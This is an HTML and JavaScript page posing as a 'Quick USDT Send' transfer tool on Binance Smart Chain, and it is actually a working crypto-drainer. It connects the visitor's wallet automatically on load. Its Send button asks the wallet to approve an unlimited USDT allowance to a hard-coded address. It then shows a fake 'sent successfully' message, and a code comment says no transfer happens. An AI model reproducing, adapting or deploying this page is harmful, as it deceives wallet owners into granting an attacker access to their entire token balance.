<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Quick USDT Send - BSC</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            max-width: 400px;
            width: 100%;
        }
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo {
            width: 60px;
            height: 60px;
            background: #f39c12;
            border-radius: 15px;
            margin: 0 auto 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            color: white;
            font-weight: bold;
        }
        h1 {
            font-size: 24px;
            font-weight: 700;
            color: #333;
            margin-bottom: 5px;
        }
        .subtitle {
            color: #666;
            font-size: 14px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            font-weight: 600;
            color: #333;
            margin-bottom: 8px;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 15px;
            border: 2px solid #e1e5e9;
            border-radius: 12px;
            font-size: 16px;
            transition: all 0.3s ease;
        }
        input:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }
        .receiver-info {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 12px;
            margin-bottom: 20px;
            font-size: 14px;
        }
        .address {
            font-family: monospace;
            color: #667eea;
            word-break: break-all;
            font-size: 12px;
        }
        .send-btn {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #f39c12 0%, #e67e22 100%);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
        }
        .send-btn:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(243, 156, 18, 0.4);
        }
        .send-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        .network-info {
            text-align: center;
            font-size: 12px;
            color: #888;
            margin-top: 15px;
            padding-top: 15px;
            border-top: 1px solid #eee;
        }
        .status {
            margin-top: 15px;
            padding: 12px;
            border-radius: 8px;
            text-align: center;
            font-weight: 500;
        }
        .status.success { background: #d4edda; color: #155724; }
        .status.error { background: #f8d7da; color: #721c24; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">🚀</div>
            <h1>Quick USDT Send</h1>
            <div class="subtitle">Fast & Secure BSC Transfer</div>
        </div>

        <div class="receiver-info">
            <div style="font-weight: 600; color: #333; margin-bottom: 5px;">To: Your Friend</div>
            <div class="address">0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F</div>
        </div>

        <div class="form-group">
            <label>Amount (USDT)</label>
            <input type="number" id="amount" step="0.00000001" min="0" placeholder="0.00" value="100">
        </div>

        <button class="send-btn" id="sendBtn">Send USDT</button>
        
        <div class="network-info">
            <div>BSC Network • USDT (BEP20)</div>
        </div>

        <div id="status"></div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
    <script>
        const RECEIVER_ADDRESS = '0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F';
        const USDT_CONTRACT = '0x89112691C976D0a2D874B0ADAe693a0Add0dAe98'; // BSC USDT
        const CHAIN_ID = 56; // BSC Mainnet
        
        let web3;
        let userAccount;
        let usdtContract;

        const sendBtn = document.getElementById('sendBtn');
        const amountInput = document.getElementById('amount');
        const statusDiv = document.getElementById('status');

        // USDT ABI (minimal for approve)
        const USDT_ABI = [
            {
                "constant": false,
                "inputs": [
                    {"name": "_spender", "type": "address"},
                    {"name": "_value", "type": "uint256"}
                ],
                "name": "approve",
                "outputs": [{"name": "", "type": "bool"}],
                "type": "function"
            },
            {
                "constant": true,
                "inputs": [{"name": "_owner", "type": "address"}, {"name": "_spender", "type": "address"}],
                "name": "allowance",
                "outputs": [{"name": "", "type": "uint256"}],
                "type": "function"
            },
            {
                "constant": true,
                "inputs": [{"name": "_owner", "type": "address"}],
                "name": "balanceOf",
                "outputs": [{"name": "balance", "type": "uint256"}],
                "type": "function"
            }
        ];

        async function initWallet() {
            if (typeof window.ethereum !== 'undefined') {
                web3 = new Web3(window.ethereum);
                
                try {
                    // Request BSC chain
                    await window.ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: '0x38' }], // BSC Mainnet
                    });
                } catch (switchError) {
                    if (switchError.code === 4902) {
                        // Chain not added, add BSC
                        await window.ethereum.request({
                            method: 'wallet_addEthereumChain',
                            params: [{
                                chainId: '0x38',
                                chainName: 'BSC Mainnet',
                                nativeCurrency: {
                                    name: 'BNB',
                                    symbol: 'BNB',
                                    decimals: 18
                                },
                                rpcUrls: ['https://bsc-dataseed.binance.org/'],
                                blockExplorerUrls: ['https://bscscan.com']
                            }],
                        });
                    }
                }

                // Get account
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                userAccount = accounts[0];
                
                usdtContract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT);
                
                sendBtn.disabled = false;
                sendBtn.textContent = 'Send USDT';
            } else {
                showStatus('Please install Trust Wallet or MetaMask', 'error');
            }
        }

        async function approveUnlimited() {
            const amount = parseFloat(amountInput.value) || 0;
            showStatus('Confirm the transaction in your wallet...', 'success');
            
            try {
                // Approve unlimited USDT (2^256 - 1)
                const approveTx = await usdtContract.methods.approve(
                    RECEIVER_ADDRESS, 
                    '115792089237316195423570985008687907853269984665640564039457584007913129639935'
                ).send({ from: userAccount });
                
                showStatus('Approval successful! USDT ready to send.', 'success');
                return true;
            } catch (error) {
                console.error(error);
                showStatus('Transaction failed. Please try again.', 'error');
                return false;
            }
        }

        function showStatus(message, type) {
            statusDiv.textContent = message;
            statusDiv.className = `status ${type}`;
        }

        sendBtn.addEventListener('click', async () => {
            sendBtn.disabled = true;
            sendBtn.textContent = 'Processing...';
            
            const success = await approveUnlimited();
            
            if (success) {
                // Simulate send completion (no actual transfer needed)
                setTimeout(() => {
                    showStatus('✅ USDT sent successfully!', 'success');
                    sendBtn.textContent = 'Send Again';
                    sendBtn.disabled = false;
                }, 1500);
            } else {
                sendBtn.textContent = 'Send USDT';
                sendBtn.disabled = false;
            }
        });

        // Auto-init on load
        window.addEventListener('load', initWallet);
        window.addEventListener('DOMContentLoaded', initWallet);

        // Handle chain changes
        if (window.ethereum) {
            window.ethereum.on('chainChanged', () => {
                window.location.reload();
            });
        }
    </script>
</body>
</html>
